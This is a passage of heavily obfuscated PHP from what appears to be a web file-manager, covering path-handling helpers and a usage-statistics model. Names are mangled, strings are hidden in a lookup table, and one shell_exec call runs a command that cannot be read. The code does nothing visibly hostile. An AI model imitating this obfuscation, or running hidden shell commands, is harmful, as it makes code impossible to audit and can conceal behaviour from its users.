(in_array($¡¨Â‹ôË, $Ú†›á£‰)) { $ã½‚€º­[$¿Â’‰¬[1164]] = $Ç§ÙÇ ı[1]; $ã½‚€º­[$¿Â’‰¬[33]] = $¡¨Â‹ôË; $ã½‚€º­[$¿Â’‰¬[1257]] = substr($¡¨Â‹ôË, 1, -1); $ã½‚€º­[$¿Â’‰¬[392]] = $Ç§ÙÇ ı[3]; } $ã½‚€º­[$¿Â’‰¬[1163]] = $Ç§ÙÇ ı[4]; } $¸­ˆ•óí = array($¿Â’‰¬[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $ã½‚€º­[$¿Â’‰¬[1219]] = in_array($ã½‚€º­[$¿Â’‰¬[33]], $¸­ˆ•óí); return $ã½‚€º­; } public static function isTruePath($…ÌÛ©) { $Ï˜¶ë…Ç =& $_SERVER[Ãìšã«™]; if (substr($…ÌÛ©, 0, 1) != $Ï˜¶ë…Ç[1256]) { return !0; } if (strpos($…ÌÛ©, $Ï˜¶ë…Ç[409]) === 0) { return !0; } if (strpos($…ÌÛ©, $Ï˜¶ë…Ç[1223]) === 0) { return !0; } if (strpos($…ÌÛ©, $Ï˜¶ë…Ç[1258]) === 0) { return !0; } if (strpos($…ÌÛ©, $Ï˜¶ë…Ç[1259]) === 0) { return !0; } if (strpos($…ÌÛ©, $Ï˜¶ë…Ç[1260]) === 0) { return !0; } return !1; } public static function clear($–¿¨õü¼) { $åÀÃ‡È¾ =& $_SERVER[Ãìšã«™]; $–¿¨õü¼ = str_replace(array($åÀÃ‡È¾[1074], $åÀÃ‡È¾[226]), $åÀÃ‡È¾[53], $–¿¨õü¼); $–¿¨õü¼ = str_replace($åÀÃ‡È¾[98], $åÀÃ‡È¾[8], $–¿¨õü¼); $±ÉŠÍ‡´ = $åÀÃ‡È¾[1261]; if (substr($–¿¨õü¼, 0, 3) == $åÀÃ‡È¾[1262]) { $–¿¨õü¼ = substr($–¿¨õü¼, 3); } while (strstr($–¿¨õü¼, $±ÉŠÍ‡´)) { $–¿¨õü¼ = str_replace($±ÉŠÍ‡´, $åÀÃ‡È¾[8], $–¿¨õü¼); } $–¿¨õü¼ = preg_replace($åÀÃ‡È¾[1263], $åÀÃ‡È¾[8], $–¿¨õü¼); if ($–¿¨õü¼ == $åÀÃ‡È¾[8]) { return $åÀÃ‡È¾[8]; } $–¿¨õü¼ = rtrim($–¿¨õü¼, $åÀÃ‡È¾[8]); return $–¿¨õü¼; } public static function sourceID($à–ìöñ‚) { $Å¦ èêì =& $_SERVER[Ãìšã«™]; $ÛÚÚ‡ª¥ = self::parse($à–ìöñ‚); if ($ÛÚÚ‡ª¥[$Å¦ èêì[33]] !== self::KOD_SOURCE) { show_json(LNG($Å¦ èêì[1264]), !1); } return $ÛÚÚ‡ª¥[$Å¦ èêì[392]]; } public static function make($‹î¨ñôÃ) { if (!$‹î¨ñôÃ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($‹î¨ñôÃ)); } public static function makeShare($ªı‡’§¨, $•ƒ¢ôÉ¢) { return self::makePath(self::KOD_SHARE_ITEM, $ªı‡’§¨, $•ƒ¢ôÉ¢); } public static function makeFileTypePath($Íéàá®‹) { return self::makePath(self::KOD_USER_FILE_TYPE, $Íéàá®‹); } public static function makeFileTagPath($Ûƒ“‡™±) { return self::makePath(self::KOD_USER_FILE_TAG, $Ûƒ“‡™±); } public static function makePath($ËÜ€êÙ¬, $İÂ™¶ú– = '', $¹í·ô¯Õ = '') { $ŠóÏõã– =& $_SERVER[Ãìšã«™]; $Ÿ÷‰ÕÙˆ = substr($ËÜ€êÙ¬, 1, -1); $Ë–ˆ¥ğ« = $ŠóÏõã–[1265] . $Ÿ÷‰ÕÙˆ . $ŠóÏõã–[1266] . $İÂ™¶ú– . $ŠóÏõã–[1267]; $Ë–ˆ¥ğ« = $¹í·ô¯Õ ? $Ë–ˆ¥ğ« . $¹í·ô¯Õ . $ŠóÏõã–[8] : $Ë–ˆ¥ğ«; return $Ë–ˆ¥ğ«; } public static function hashPath($ŸÉõÏá˜, $ĞàºÕ¦ = true) { $ØØÇˆ„ =& $_SERVER[Ãìšã«™]; $„àöò¿ = is_array($ŸÉõÏá˜) ? $ŸÉõÏá˜ : IO::info($ŸÉõÏá˜); $®¤‹Çƒ÷ = _get($„àöò¿, $ØØÇˆ„[1268], $ØØÇˆ„[12]); if (!$®¤‹Çƒ÷ && isset($„àöò¿[$ØØÇˆ„[403]])) { $„àöò¿ = IO::info(KodIO::make($„àöò¿[$ØØÇˆ„[403]])); $®¤‹Çƒ÷ = _get($„àöò¿, $ØØÇˆ„[1268], $ØØÇˆ„[12]); } if (!$®¤‹Çƒ÷ && $ĞàºÕ¦) { $œŸ¨£¤‹ = KodIO::parse($„àöò¿[$ØØÇˆ„[78]]); if (!$œŸ¨£¤‹[$ØØÇˆ„[33]]) { $®¤‹Çƒ÷ = IO::hashSimple($„àöò¿[$ØØÇˆ„[78]]); } } if (!$®¤‹Çƒ÷) { $®¤‹Çƒ÷ = md5($„àöò¿[$ØØÇˆ„[78]] . $„àöò¿[$ØØÇˆ„[80]] . $„àöò¿[$ØØÇˆ„[86]]); } return $®¤‹Çƒ÷; } public static function initSystemPath() { $¯ÏØç³º =& $_SERVER[Ãìšã«™]; if (defined($¯ÏØç³º[1269])) { return; } define($¯ÏØç³º[1269], self::systemPath($¯ÏØç³º[1270])); define($¯ÏØç³º[1271], self::systemPath($¯ÏØç³º[1272])); define($¯ÏØç³º[1273], self::systemPath($¯ÏØç³º[1274])); define($¯ÏØç³º[1275], self::systemPath($¯ÏØç³º[1276])); IOHistory::bindEvent(); } public static function systemPath($Ä‹ğÁø) { $²×…¿ŸÑ =& $_SERVER[Ãìšã«™]; $¦ïÓ›ö  = $²×…¿ŸÑ[1277] . ucfirst($Ä‹ğÁø); $£¨¸‚©‘ = Model($²×…¿ŸÑ[771])->get($¦ïÓ›ö ); if ($£¨¸‚©‘) { return $£¨¸‚©‘; } if ($Ä‹ğÁø == $²×…¿ŸÑ[1270]) { $£¨¸‚©‘ = self::make(Model($²×…¿ŸÑ[826])->systemRootPathAdd($²×…¿ŸÑ[537])); } else { $£¨¸‚©‘ = self::systemPath($²×…¿ŸÑ[1270]); $¹µÑï = self::sourceID($£¨¸‚©‘); $£¨¸‚©‘ = self::make(Model($²×…¿ŸÑ[826])->mkdir($¹µÑï, $Ä‹ğÁø)); } Model($²×…¿ŸÑ[771])->set($¦ïÓ›ö , $£¨¸‚©‘); return $£¨¸‚©‘; } public static function systemFolder($ÈÌ”¬Âñ) { $Ó‹í õñ = IO_PATH_SYSTEM_SOURCE . $ÈÌ”¬Âñ; $‰ÈÈ¨÷± = Cache::get($Ó‹í õñ); if (!$‰ÈÈ¨÷±) { $ö¶¥¿é = IO::infoFull($Ó‹í õñ); if (!$ö¶¥¿é) { $‰ÈÈ¨÷± = IO::mkdir($Ó‹í õñ, REPEAT_SKIP); } else { $‰ÈÈ¨÷± = $ö¶¥¿é[$_SERVER[Ãìšã«™][78]]; } Cache::set($Ó‹í õñ, $‰ÈÈ¨÷±, 3600 * 10); } return $‰ÈÈ¨÷±; } public static function defaultDriver() { return Model($_SERVER[Ãìšã«™][768])->defaultDriver(); } public static function defaultIO() { $Üí½åã· =& $_SERVER[Ãìšã«™]; $ß¥®®¸§ = self::defaultDriver(); return $Üí½åã·[1278] . $ß¥®®¸§[$Üí½åã·[392]] . $Üí½åã·[1267]; } public static function defaultDriverInit() { static $–¨â¤Û™ = false; if ($–¨â¤Û™) { return $–¨â¤Û™; } $–¨â¤Û™ = IO::init(self::defaultIO()); return $–¨â¤Û™; } public static function fileTypeList() { $‹¼Ÿä·ò =& $_SERVER[Ãìšã«™]; $µÇêÎİ’ = $GLOBALS[$‹¼Ÿä·ò[6]][$‹¼Ÿä·ò[1279]]; foreach ($µÇêÎİ’ as $å«ô¡Õî => $¶¼ÉëÚĞ) { $‹· Â·¢ = $‹¼Ÿä·ò[1280] . $å«ô¡Õî; $Ÿ’€ëûƒ = LNG($‹· Â·¢); if ($‹· Â·¢ != $Ÿ’€ëûƒ) { $µÇêÎİ’[$å«ô¡Õî][$‹¼Ÿä·ò[32]] = $Ÿ’€ëûƒ; } } return $µÇêÎİ’; } public static function diskList($ã£ÚÒü = true) { $íóá÷´À = $_SERVER[Ãìšã«™][1281]; if ($ã£ÚÒü) { $¬—ùªøæ = Cache::get($íóá÷´À); if (is_array($¬—ùªøæ)) { return $¬—ùªøæ; } } $¬—ùªøæ = self::diskListGet(); Cache::set($íóá÷´À, $¬—ùªøæ, 60); return $¬—ùªøæ; } public static function diskListGet() { $€µ—² =& $_SERVER[Ãìšã«™]; $ŒşÙ™¬ = array(); if ($GLOBALS[$€µ—²[6]][$€µ—²[1282]] == $€µ—²[1283]) { $ôëÎŒ = $€µ—²[1284]; for ($á’ú£šú = 0; $á’ú£šú < strlen($ôëÎŒ); $á’ú£šú++) { $ááôú„¹ = $ôëÎŒ[$á’ú£šú] . $€µ—²[1285]; if (file_exists($ááôú„¹)) { $ŒşÙ™¬[] = $ááôú„¹; } } return $ŒşÙ™¬; } if (!function_exists($€µ—²[99])) { $ŒşÙ™¬[] = $€µ—²[836]; return $ŒşÙ™¬; } $¢ìôœ´” = explode($€µ—²[226], shell_exec($€µ—²[1286])); array_shift($¢ìôœ´”); array_pop($¢ìôœ´”); $ş ¡Å€ = array($€µ—²[1287], $€µ—²[1288], $€µ—²[1289], $€µ—²[1290], $€µ—²[1291], $€µ—²[1292], $€µ—²[1293], $€µ—²[1294]); foreach ($¢ìôœ´” as $¾Éåºˆù) { $“¢íÎÌ = preg_split($€µ—²[1295], $¾Éåºˆù); $ááôú„¹ = $“¢íÎÌ[count($“¢íÎÌ) - 1]; if (!strstr($“¢íÎÌ[0], $€µ—²[1296]) || !$ááôú„¹) { continue; } $şĞÑ–š = rtrim($ááôú„¹, $€µ—²[8]) . $€µ—²[8]; if (in_array($şĞÑ–š, $ş ¡Å€)) { continue; } $ŒşÙ™¬[] = $şĞÑ–š; } return $ŒşÙ™¬; } public static function isSameDisk($ç„âáƒğ, $àÉò€) { $ÃÛ°ÜÁ² =& $_SERVER[Ãìšã«™]; if ($GLOBALS[$ÃÛ°ÜÁ²[6]][$ÃÛ°ÜÁ²[1282]] == $ÃÛ°ÜÁ²[1283]) { return strtolower(substr($ç„âáƒğ, 0, 1)) == strtolower(substr($àÉò€, 0, 1)); } $”²˜¡ŞÆ = self::diskList(); $–©ì  = !1; $àÎ˜´ÖÊ = !1; sort($”²˜¡ŞÆ); $”²˜¡ŞÆ = array_reverse($”²˜¡ŞÆ); $ç„âáƒğ = rtrim($ç„âáƒğ, $ÃÛ°ÜÁ²[8]) . $ÃÛ°ÜÁ²[8]; $àÉò€ = rtrim($àÉò€, $ÃÛ°ÜÁ²[8]) . $ÃÛ°ÜÁ²[8]; foreach ($”²˜¡ŞÆ as $÷×ÔÌòœ) { $›¿½ÌÒ = strlen($÷×ÔÌòœ); if (!$–©ì  && substr($ç„âáƒğ, 0, $›¿½ÌÒ) == $÷×ÔÌòœ) { $–©ì  = $÷×ÔÌòœ; } if (!$àÎ˜´ÖÊ && substr($àÉò€, 0, $›¿½ÌÒ) == $÷×ÔÌòœ) { $àÎ˜´ÖÊ = $÷×ÔÌòœ; } if ($–©ì  && $àÎ˜´ÖÊ) { break; } } return $–©ì  === $àÎ˜´ÖÊ; } public static function transferType($½‰†¶è, $¡ù„Êæ¨) { $Ú–â±İ =& $_SERVER[Ãìšã«™]; $•Éè«˜‹ = self::driverType($½‰†¶è); $İ ëÈÚ = self::driverType($¡ù„Êæ¨); if ($•Éè«˜‹[$Ú–â±İ[33]] == $İ ëÈÚ[$Ú–â±İ[33]] && $•Éè«˜‹[$Ú–â±İ[1297]] == $İ ëÈÚ[$Ú–â±İ[1297]]) { return $Ú–â±İ[1298]; } if ($•Éè«˜‹[$Ú–â±İ[33]] == $Ú–â±İ[865] && $İ ëÈÚ[$Ú–â±İ[33]] == $Ú–â±İ[107]) { return $Ú–â±İ[1193]; } if ($•Éè«˜‹[$Ú–â±İ[33]] == $Ú–â±İ[107] && $İ ëÈÚ[$Ú–â±İ[33]] == $Ú–â±İ[865]) { return $Ú–â±İ[108]; } return $Ú–â±İ[1299]; } public static function driverType($‘Ìşí½) { $ê˜ÏèÀ¿ =& $_SERVER[Ãìšã«™]; $‘Ï†ëÈ½ = str_replace($ê˜ÏèÀ¿[1300], $ê˜ÏèÀ¿[12], strtolower($‘Ìşí½->getType())); if ($‘Ï†ëÈ½ == $ê˜ÏèÀ¿[759] || $‘Ï†ëÈ½ == $ê˜ÏèÀ¿[1301] || $‘Ï†ëÈ½ == $ê˜ÏèÀ¿[1302]) { $‘Ìşí½ = self::defaultDriverInit(); } else { if ($‘Ï†ëÈ½ == $ê˜ÏèÀ¿[1200] || $‘Ï†ëÈ½ == $ê˜ÏèÀ¿[1303]) { $‘Ìşí½ = IO::init($‘Ìşí½->pathParse[$ê˜ÏèÀ¿[1147]]); } } $•óÃˆª = $‘Ìşí½->path; $‘Ï†ëÈ½ = str_replace($ê˜ÏèÀ¿[1300], $ê˜ÏèÀ¿[12], strtolower($‘Ìşí½->getType())); if ($‘Ï†ëÈ½ == $ê˜ÏèÀ¿[107]) { return array($ê˜ÏèÀ¿[33] => $ê˜ÏèÀ¿[107], $ê˜ÏèÀ¿[1297] => $ê˜ÏèÀ¿[12], $ê˜ÏèÀ¿[78] => $•óÃˆª); } return array($ê˜ÏèÀ¿[33] => $ê˜ÏèÀ¿[865], $ê˜ÏèÀ¿[1297] => $‘Ìşí½->pathDriver, $ê˜ÏèÀ¿[78] => $•óÃˆª); } public static function pathDriverType($Œ¾•àæØ) { return $Œ¾•àæØ ? self::driverType(IO::init($Œ¾•àæØ)) : !1; } } goto a×ä»åàŠŞ; bª¨š›ãŒ´: class AnalysisModel extends ModelBaseLight { public function init($»È›€¡Ç) { $ôÇ‘ğŞ =& $_SERVER[Ãìšã«™]; $«¤Å„ê± = array($ôÇ‘ğŞ[594] => array($ôÇ‘ğŞ[33] => $ôÇ‘ğŞ[1747], $ôÇ‘ğŞ[268] => array($ôÇ‘ğŞ[219], $ôÇ‘ğŞ[766], $ôÇ‘ğŞ[1748], $ôÇ‘ğŞ[1749])), $ôÇ‘ğŞ[1750] => array($ôÇ‘ğŞ[33] => $ôÇ‘ğŞ[1751], $ôÇ‘ğŞ[268] => array($ôÇ‘ğŞ[219], $ôÇ‘ğŞ[764], $ôÇ‘ğŞ[1752], $ôÇ‘ğŞ[1753], $ôÇ‘ğŞ[1754]))); if (!isset($«¤Å„ê±[$»È›€¡Ç])) { return !1; } $this->optionType = $«¤Å„ê±[$»È›€¡Ç][$ôÇ‘ğŞ[33]]; $this->field = $«¤Å„ê±[$»È›€¡Ç][$ôÇ‘ğŞ[268]]; return !0; } public function listData($³ÏŠ§÷ = false, $Ôâƒæ¤´ = "\155\157\144\x69\x66\x79\x54\151\x6d\x65", $÷Ê˜‹± = false) { return parent::listData($³ÏŠ§÷, $Ôâƒæ¤´, $÷Ê˜‹±); } public function trendList($¾ôƒ³µ„) { $¨æü˜ö =& $_SERVER[Ãìšã«™]; $Ş«÷îû¦ = $this->listData(); if ($Ş«÷îû¦) { $Ää¸Èø¨ = end($Ş«÷îû¦); $ ±›Ù•¸ = date($¨æü˜ö[1755], strtotime($¨æü˜ö[1756])); if ($Ää¸Èø¨[$¨æü˜ö[219]] == $ ±›Ù•¸) { return $Ş«÷îû¦; } $Ë®ô©Á¦ = strtotime($Ää¸Èø¨[$¨æü˜ö[219]]); } if (!isset($Ë®ô©Á¦)) { $¼§¿·ƒ¢ = $¾ôƒ³µ„ == $¨æü˜ö[594] ? $¨æü˜ö[538] : $¨æü˜ö[826]; $Ë®ô©Á¦ = Model($¼§¿·ƒ¢)->min($¨æü˜ö[193]); } $òÄËûµ” = $¨æü˜ö[1757] . ucfirst($¾ôƒ³µ„); $„Ÿ˜ÏïÏ = $this->dateList($Ë®ô©Á¦); foreach ($„Ÿ˜ÏïÏ as $ ±›Ù•¸) { $this->{$òÄËûµ”}($ ±›Ù•¸); } return $this->listData(); } private function dateList($ÓÓÍ¦ú¨) { $Ÿ¢±¦ÕÔ =& $_SERVER[Ãìšã«™]; $° …˜şÔ = $ÓÓÍ¦ú¨; $Œ´ğó„ = strtotime($Ÿ¢±¦ÕÔ[1756]); $™•óŠ… = array(); while ($° …˜şÔ <= $Œ´ğó„) { $™•óŠ…[] = date($Ÿ¢±¦ÕÔ[1755], $° …˜şÔ); $° …˜şÔ = strtotime($Ÿ¢±¦ÕÔ[1758], $° …˜şÔ); } return $™•óŠ…; } public function _recordUser($Õôâ°Ç = '') { $±Ñœë‘â =& $_SERVER[Ãìšã«™]; $½Ë±¢Ó = strtotime(date($±Ñœë‘â[1759], strtotime($Õôâ°Ç))); $¤©£„Æ = strtotime(date($±Ñœë‘â[1760], strtotime($Õôâ°Ç))); $Ôóõî„ª = array($±Ñœë‘â[193] => array($±Ñœë‘â[1009], $¤©£„Æ)); $èª×é§Õ = Model($±Ñœë‘â[538])->where($Ôóõî„ª)->count($±Ñœë‘â[1650]); $Ôóõî„ª[$±Ñœë‘â[193]] = array($±Ñœë‘â[328], array($½Ë±¢Ó, $¤©£„Æ)); $ı¤Í¡˜– = Model($±Ñœë‘â[538])->where($Ôóõî„ª)->count($±Ñœë‘â[1650]); $Ôóõî„ª[$±Ñœë‘â[33]] = $±Ñœë‘â[1761]; $û×Á‘®ƒ = Model($±Ñœë‘â[1762])->where($Ôóõî„ª)->count($±Ñœë‘â[1763]); $ÓÃ´«ºï = array($±Ñœë‘â[219] => $Õôâ°Ç, $±Ñœë‘â[766] => (int) $èª×é§Õ, $±Ñœë‘â[1748] => (int) $ı¤Í¡˜–, $±Ñœë‘â[1749] => (int) $û×Á‘®ƒ); return $this->insert($ÓÃ´«ºï); } public function _recordStore($€ÔŒöÖü = '') { $ˆÒË™ñÑ =& $_SERVER[Ãìšã«™]; $òï›Ã¯ë = strtotime(date($ˆÒË™ñÑ[1760], strtotime($€ÔŒöÖü))); $‹×ç³Ñ¬ = array($ˆÒË™ñÑ[193] => array($ˆÒË™ñÑ[1009], $òï›Ã¯ë)); $ñÎà­« = Model($ˆÒË™ñÑ[470])->where($‹×ç³Ñ¬)->sum($ˆÒË™ñÑ[80]); $‹×ç³Ñ¬[$ˆÒË™ñÑ[411]] = 0; $ù¿Ù„ÎÅ = Model($ˆÒË™ñÑ[826])->where($‹×ç³Ñ¬)->sum($ˆÒË™ñÑ[80]); $‹×ç³Ñ¬[$ˆÒË™ñÑ[412]] = 1; $ŒêÛş¸Ü = Model($ˆÒË™ñÑ[826])->where($‹×ç³Ñ¬)->sum($ˆÒË™ñÑ[80]); $‹×ç³Ñ¬[$ˆÒË™ñÑ[412]] = 2; $²âªç•¦ = Model($ˆÒË™ñÑ[826])->where($‹×ç³Ñ¬)->sum($ˆÒË™ñÑ[80]); $½¶£– = array($ˆÒË™ñÑ[219] => $€ÔŒöÖü, $ˆÒË™ñÑ[764] => (int) $ù¿Ù„ÎÅ, $ˆÒË™ñÑ[1752] => (int) $ñÎà­«, $ˆÒË™ñÑ[1753] => (int) $ŒêÛş¸Ü, $ˆÒË™ñÑ[1754] => (int) $²âªç•¦); return $this->insert($½¶£–); } public function trend($·ûóìŒ, $Çá—±›ğ) { $½şòÓ¸ =& $_SERVER[Ãìšã«™]; if (!$this->init($·ûóìŒ)) { return !1; } $ËŒ¶Ö·Š = $this->trendList($·ûóìŒ); if ($ËŒ¶Ö·Š && $Çá—±›ğ != $½şòÓ¸[1623]) { $¿‹Ë‘Ñ = $ËŒ¶Ö·Š[0][$½şòÓ¸[219]]; $¯³”¸—¢ = $this->validDate($Çá—±›ğ, $¿‹Ë‘Ñ); $Õ›»¸•‘ = array(); $¤‡Õ‚ô = array_to_keyvalue($ËŒ¶Ö·Š, $½şòÓ¸[219]); foreach ($¯³”¸—¢ as $—Û°ãŞ­) { if (isset($¤‡Õ‚ô[$—Û°ãŞ­])) { $ÉèŞ‚¤´ = $¤‡Õ‚ô[$—Û°ãŞ­]; } else { $ÉèŞ‚¤´ = end($ËŒ¶Ö·Š); $ÉèŞ‚¤´[$½şòÓ¸[219]] = $—Û°ãŞ­; if ($·ûóìŒ == $½şòÓ¸[594]) { $ÉèŞ‚¤´[$½şòÓ¸[1748]] = $ÉèŞ‚¤´[$½şòÓ¸[1749]] = 0; } } $Õ›»¸•‘[] = $ÉèŞ‚¤´; } $ËŒ¶Ö·Š = $Õ›»¸•‘; } $ú›´úù¤ = array($½şòÓ¸[594] => array($½şòÓ¸[766] => LNG($½şòÓ¸[1764]), $½şòÓ¸[1748] => LNG($½şòÓ¸[1765]), $½şòÓ¸[1749] => LNG($½şòÓ¸[1766])), $½şòÓ¸[1750] => array($½şòÓ¸[764] => LNG($½şòÓ¸[1767]), $½şòÓ¸[1752] => LNG($½şòÓ¸[1768]), $½şòÓ¸[1753] => LNG($½şòÓ¸[1769]), $½şòÓ¸[1754] => LNG($½şòÓ¸[1770]))); $ë¨•³ÓŠ = array($½şòÓ¸[594] => $½şòÓ¸[1771], $½şòÓ¸[1750] => $½şòÓ¸[80]); if (empty($ËŒ¶Ö·Š)) { $—Û°ãŞ­ = date($½şòÓ¸[1755], strtotime($½şòÓ¸[1756])); $·„êÎÀû = array($½şòÓ¸[219] => $—Û°ãŞ­); foreach ($ú›´úù¤[$·ûóìŒ] as $‚§¤ÙÎ¬ => $ÖÚÔŒÄ) { $·„êÎÀû[$‚§¤ÙÎ¬] = 0; } $ËŒ¶Ö·Š[] = $·„êÎÀû; } $×¬´ıµ¾ = array(); foreach ($ËŒ¶Ö·Š as $ÖÚÔŒÄ) { if ($·ûóìŒ == $½şòÓ¸[1750] && $ÖÚÔŒÄ[$½şòÓ¸[1752]] > $ÖÚÔŒÄ[$½şòÓ¸[764]]) { $ÖÚÔŒÄ[$½şòÓ¸[1752]] = $ÖÚÔŒÄ[$½şòÓ¸[764]]; } foreach ($ú›´úù¤[$·ûóìŒ] as $‚§¤ÙÎ¬ => $º˜ç‹¼©) { $ÉèŞ‚¤´ = array($½şòÓ¸[219] => $ÖÚÔŒÄ[$½şòÓ¸[219]], $½şòÓ¸[1548] => $º˜ç‹¼©); $ÉèŞ‚¤´[$ë¨•³ÓŠ[$·ûóìŒ]] = isset($ÖÚÔŒÄ[$‚§¤ÙÎ¬]) ? $ÖÚÔŒÄ[$‚§¤ÙÎ¬] : 0; $×¬´ıµ¾[] = $ÉèŞ‚¤´; } } return $×¬´ıµ¾; } public function validDate($òí˜“óí, $ó¤¾õè) { $İ¾ÚŠ « =& $_SERVER[Ãìšã«™]; $¹ş¡•Œí = date($İ¾ÚŠ «[1755], strtotime($İ¾ÚŠ «[1756])); $ã£ÕÅÀÛ = array($¹ş¡•Œí); switch ($òí˜“óí) { case $İ¾ÚŠ «[1630]: $ÙÚ¯ÒóŠ = mktime(0, 0, 0, date($İ¾ÚŠ «[1772]), date($İ¾ÚŠ «[1369]) - date($İ¾ÚŠ «[1432]) + 7 - 7, date($İ¾ÚŠ «[1773])); $İ®¿ô£Ã = 0; do { $ ¾ÒáÈ¥ = date($İ¾ÚŠ «[1755], $ÙÚ¯ÒóŠ - 3600 * 24 * 7 * $İ®¿ô£Ã); $ã£ÕÅÀÛ[] = $ ¾ÒáÈ¥; $İ®¿ô£Ã++; } while ($ó¤¾õè < $ ¾ÒáÈ¥); break; case $İ¾ÚŠ «[1628]: $İ®¿ô£Ã = 1; do { $¦­µî = date($İ¾ÚŠ «[1774], strtotime("\x2d\40{$İ®¿ô£Ã}\40\155\x6f\x6e\x74\150\163")); $ã£ÕÅÀÛ[] = $¦­µî; $İ®¿ô£Ã++; } while ($ó¤¾õè < $¦­µî); break; case $İ¾ÚŠ «[1775]: $ñµ“•ëÜ = (int) date($İ¾ÚŠ «[1773], strtotime($ó¤¾õè)); $–àÓ²øÙ = (int) date($İ¾ÚŠ «[1773]); if ($ñµ“•ëÜ >= $–àÓ²øÙ) { break; } for ($ñµ“•ëÜ; $ñµ“•ëÜ < $–àÓ²øÙ; $ñµ“•ëÜ++) { $ã£ÕÅÀÛ[] = $ñµ“•ëÜ . $İ¾ÚŠ «[1776]; } break; default: break; } if ($ó¤¾õè > end($ã£ÕÅÀÛ)) { array_pop($ã£ÕÅÀÛ); } sort($ã£ÕÅÀÛ); return $ã£ÕÅÀÛ; } public function listTable($±…ğú) { $×êÓ†ƒ³ = ucfirst($±…ğú); return Model($×êÓ†ƒ³)->listData(); } public function option($¡ê‚ìÛ‡) { $³»¹ï­— = $_SERVER[Ãìšã«™][1777] . ucfirst($¡ê‚ìÛ‡); return $this->{$³»¹ï­—}(); } private function optionUser() { $…½»¿òë =& $_SERVER[Ãìšã«™]; $±íí¥Ö¾ = Model($…½»¿òë[538])->count($…½»¿òë[1650]); $Ç¬¶†Øª = Model($…½»¿òë[538])->where($…½»¿òë[1778])->count($…½»¿òë[1650]); $®á³–¬î = intval($GLOBALS[$…½»¿òë[6]][$…½»¿òë[344]][$…½»¿òë[1606]]) / 3600; $šıĞ²¨‚ = strtotime("\x2d{$®á³–¬î}\x20\150\157\165\162\x73"); $ù…Ìúóá = strtotime(date($…½»¿òë[1759])); if ($šıĞ²¨‚ < $ù…Ìúóá) { $šıĞ²¨‚ = $ù…Ìúóá; } $Á¸¢“ÂÙ = array($…½»¿òë[1779] => array($…½»¿òë[1010], $šıĞ²¨‚)); $µÛ˜ä¬¾ = (int) Model($…½»¿òë[538])->where($Á¸¢“ÂÙ)->count($…½»¿òë[1650]); if (!$µÛ˜ä¬¾) { $µÛ˜ä¬¾ = 1; } $Á¸¢“ÂÙ = array($…½»¿òë[1779] => array($…½»¿òë[1010], $ù…Ìúóá)); $×¿·»µü = Model($…½»¿òë[538])->where($Á¸¢“ÂÙ)->count($…½»¿òë[1650]); return array($…½»¿òë[760] => (int) $±íí¥Ö¾, $…½»¿òë[1780] => (int) ($±íí¥Ö¾ - $Ç¬¶†Øª), $…½»¿òë[1781] => (int) $Ç¬¶†Øª, $…½»¿òë[1782] => (int) $×¿·»µü, $…½»¿òë[1783] => $µÛ˜ä¬¾); } private function optionFile() { $¡’éÁ“ =& $_SERVER[Ãìšã«™]; $§„•ô†‘ = $this->sourceSize(); $ı™Í­Æ = $§„•ô†‘[$¡’éÁ“[80]]; $§äã×ÉÁ = $§„•ô†‘[$¡’éÁ“[1752]]; $Ê»ÑÛ¸• = Model($¡’éÁ“[826])->where(array($¡’éÁ“[411] => 0))->count($¡’éÁ“[403]); $äç¿º¶ú = array($¡’éÁ“[411] => 0, $¡’éÁ“[193] => array($¡’éÁ“[1010], strtotime(date($¡’éÁ“[1759])))); $•Ê„ºë¹ = Model($¡’éÁ“[826])->where($äç¿º¶ú)->sum($¡’éÁ“[80]); $ˆÑí‹´‡ = Model($¡’éÁ“[826])->where($äç¿º¶ú)->count($¡’éÁ“[403]); return array($¡’éÁ“[764] => $ı™Í­Æ, $¡’éÁ“[1752] => $§äã×ÉÁ, $¡’éÁ“[1784] => $ı™Í­Æ - $§äã×ÉÁ, $¡’éÁ“[1785] => (int) $•Ê„ºë¹, $¡’éÁ“[766] => (int) $Ê»ÑÛ¸•, $¡’éÁ“[1786] => (int) $ˆÑí‹´‡); } private function optionAccess() { $á¦ïŠ =& $_SERVER[Ãìšã«™]; return array($á¦ïŠ[760] => $this->typeLogCnt(), $á¦ïŠ[108] => $this->typeLogCnt($á¦ïŠ[108]), $á¦ïŠ[450] => $this->typeLogCnt($á¦ïŠ[450]), $á¦ïŠ[1787] => $this->typeLogCnt($á¦ïŠ[1787]), $á¦ïŠ[1788] => $this->typeLogCnt($á¦ïŠ[1788]), $á¦ïŠ[594] => $this->typeLogCnt($á¦ïŠ[12], $á¦ïŠ[1763])); } private function typeLogCnt($”ëºéí´ = '', $ğÌ˜Ìá° = "\x69\144") { $İ¿áÍ¹Ó =& $_SERVER[Ãìšã«™]; $ç‰ÅÚ½© = array($İ¿áÍ¹Ó[108] => array($İ¿áÍ¹Ó[1789], $İ¿áÍ¹Ó[1790]), $İ¿áÍ¹Ó[450] => array($İ¿áÍ¹Ó[1791], $İ¿áÍ¹Ó[1792]), $İ¿áÍ¹Ó[1787] => array($İ¿áÍ¹Ó[1793], $İ¿áÍ¹Ó[1794], $İ¿áÍ¹Ó[1795]), $İ¿áÍ¹Ó[1788] => array($İ¿áÍ¹Ó[1796], $İ¿áÍ¹Ó[1797]), $İ¿áÍ¹Ó[1798] => array($İ¿áÍ¹Ó[1799], $İ¿áÍ¹Ó[1800], $İ¿áÍ¹Ó[1801])); $ Ô¨ãæ× = strtotime(date($İ¿áÍ¹Ó[1759])); $ü¨èúä½ = array($İ¿áÍ¹Ó[193] => array($İ¿áÍ¹Ó[1010], $ Ô¨ãæ×)); if ($”ëºéí´) { $ü¨èúä½[$İ¿áÍ¹Ó[33]] = array($İ¿áÍ¹Ó[7], $ç‰ÅÚ½©[$”ëºéí´]); } $¼ˆâŠ˜Û = Model($İ¿áÍ¹Ó[1762])->where($ü¨èúä½)->count($ğÌ˜Ìá°); return (int) $¼ˆâŠ˜Û; } private function optionServer() { $‹¦Â÷Ö =& $_SERVER[Ãìšã«™]; $…Š×çÇú = $this->diskDriver(); $ì—Ø²²œ = KodIO::defaultDriver(); $ó‘şÊ–Ò = array($‹¦Â÷Ö[818] => $ì—Ø²²œ[$‹¦Â÷Ö[392]]); $Úî±Âú™ = Model($‹¦Â÷Ö[470])->where($ó‘şÊ–Ò)->sum($‹¦Â÷Ö[80]); $üÌÉåÀú = explode($‹¦Â÷Ö[53], 